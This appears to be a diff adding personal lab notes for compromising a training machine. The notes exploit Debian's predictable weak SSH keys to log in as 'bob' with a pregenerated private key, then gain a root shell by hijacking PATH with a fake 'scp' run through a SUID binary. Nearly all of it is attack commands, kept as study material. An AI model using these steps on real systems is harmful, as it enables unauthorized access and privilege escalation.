@@ -1,0 +1,37 @@
+/var/backups/ssh
+
+add the following 2 lines at the end of /etc/ssh/ssh_config
+
+PubkeyAcceptedKeyTypes +ssh-dss
+KexAlgorithms diffie-hellman-group1-sha1,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1
+
+
+https://github.com/g0tmi1k/debian-ssh
+
+extract dsa 1024
+
+cd dsa/1024 
+
+grep some first part of authorized_keys
+
+grep -lr AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7SaFrVBuuIW+2qnDF7vybPiMNI9
+
+f1fb2162a02f0f7c40c210e6167f05ca-16858
+f1fb2162a02f0f7c40c210e6167f05ca-16858.pub
+
+ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858 bob@10.11.1.136
+
+privesc:
+
+find / -perm -u=s -type f 2>/dev/null
+
+/usr/local/bin/uploadtosecure
+
+cd /tmp
+echo /bin/sh > scp
+chmod +x scp
+export PATH=/tmp
+
+cd /usr/local/bin
+./uploadtosecure
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
